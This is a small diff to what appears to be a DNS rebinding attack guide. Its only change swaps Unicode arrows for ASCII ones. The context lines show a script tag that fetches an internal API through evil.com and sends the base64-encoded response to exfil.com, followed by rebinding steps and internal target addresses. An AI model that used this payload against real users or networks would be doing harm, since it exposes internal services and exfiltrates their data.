@@ -23,7 +23,7 @@ fetch('http://evil.com:8080/internal-api')
   .then(d => fetch('https://exfil.com/?d=' + btoa(d)));
 </script>
 ```
-→ Browser resolves evil.com → attacker IP (loads page), then resolves evil.com → 127.0.0.1 (attacks internal service).
+-> Browser resolves evil.com -> attacker IP (loads page), then resolves evil.com -> 127.0.0.1 (attacks internal service).
 
 #### STEP 3: TARGETS
 - Internal services: `localhost:8080`, `192.168.1.1`
